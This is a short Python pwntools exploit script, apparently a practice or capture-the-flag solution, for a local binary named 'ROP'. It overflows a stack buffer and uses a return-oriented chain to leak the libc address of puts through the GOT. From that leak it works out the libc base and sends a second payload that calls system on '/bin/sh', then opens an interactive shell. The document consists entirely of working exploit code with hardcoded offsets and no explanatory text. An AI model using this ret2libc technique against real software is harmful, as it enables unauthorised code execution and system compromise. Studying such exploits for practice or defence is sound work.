from pwn import *

e = ELF('./ROP')
p = process('./ROP')

gotputs = p64(e.got['puts'])
puts = p64(e.symbols['puts'])
main = p64(e.symbols['main'])
poprdi = p64(0x00000000004011d3)
saved_rip_addr = 0x7fffffffdea8
buff_addr = 0x7fffffffde20
distance = saved_rip_addr-buff_addr

print 'distance =',distance

payload = 'A'*(distance) + poprdi + gotputs + puts + main # Leak Libc printf address

log.info('Leaking libc')

p.sendline(payload)
p.recvline()
p.recvline()
puts_addr = p.recvline()[:-1]
puts_addr += '\x00'*(8-len(puts_addr))
puts_addr = u64(puts_addr)
print 'puts =', hex(puts_addr)

offset_system = 0x0000000000045380
offset_dup2 = 0x00000000000ecf40
offset_read = 0x00000000000ec760
offset_write = 0x00000000000ec800
offset_str_bin_sh = 0x184519
offset_puts = 0x0000000000072a40

libc_base = puts_addr - offset_puts
libc_system = libc_base + offset_system
libc_str_bin_sh = libc_base + offset_str_bin_sh

payload = 'A'*distance + poprdi + p64(libc_str_bin_sh) + p64(libc_system)
p.sendline(payload)

p.interactive()